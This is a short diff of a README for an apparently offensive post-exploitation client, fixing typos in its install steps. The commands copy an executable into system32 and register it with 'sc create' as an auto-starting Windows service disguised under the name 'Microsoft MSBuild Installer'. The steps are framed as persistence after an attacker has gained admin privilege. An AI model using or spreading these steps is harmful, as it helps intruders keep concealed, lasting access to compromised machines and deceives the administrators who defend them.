@@ -35,12 +35,12 @@ To install the client (post exploitation case -> admin privilege)
 
 - copy exe file in c:\windows\system32 
 ```
-ex. copy .\MsBuildInstaller.exe c:\windows\system32\MsBuildInstaller.exe)
+ex. copy .\MsBuildInstaller.exe c:\windows\system32\MsBuildInstaller.exe
 ```
 
 - Create the service as persistence
 ```
-sc create MsBuildInstaller binpath="c:\windows\system32\MsBuildInstaller.exe" DisplayName="Microsoft MSBuild Installer" start=Auto)
+sc create MsBuildInstaller binpath="c:\windows\system32\MsBuildInstaller.exe" DisplayName="Microsoft MSBuild Installer" start=Auto
 ```
   
 - run service 
